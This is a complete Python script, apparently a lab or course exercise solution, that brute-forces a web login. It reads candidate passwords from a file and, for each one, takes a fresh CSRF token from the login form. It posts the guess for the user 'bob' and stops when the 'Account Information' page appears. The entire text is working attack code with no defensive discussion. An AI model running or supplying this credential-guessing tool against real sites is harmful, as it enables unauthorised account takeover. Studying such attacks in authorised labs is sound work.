import sys
import requests
import bs4 as bs

def extract_token(response):
    soup = bs.BeautifulSoup(response.text, 'html.parser')
    for i in soup.form.find_all('input'):
        if i.get('name') == 'csrfmiddlewaretoken':
            return i.get('value')
    return None


def isloggedin(response):
    soup = bs.BeautifulSoup(response.text, 'html.parser')
    if "Account Information" in soup.text:
        return True
    return False


def test_password(address, candidates):
    session = requests.Session()
    url = f'{address}/login/'
    recovered_password = None

    for password in candidates:
        cookies = session.get(url)
        token = extract_token(cookies)
        data = {'username': 'bob', 'password': password, 'csrfmiddlewaretoken': token}
        print("Trying password:", password)

        response = session.post(url, data)
        if isloggedin(response):
            recovered_password = password
            break

    return recovered_password



def main(argv):
    address = sys.argv[1]
    fname = sys.argv[2]
    candidates = [p.strip() for p in open(fname)]
    password = test_password(address, candidates)
    if password:
        print("Password recovered:", password)
    else:
        print("None of the candidates worked.")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('usage: python %s address filename' % sys.argv[0])
    else:
        main(sys.argv)
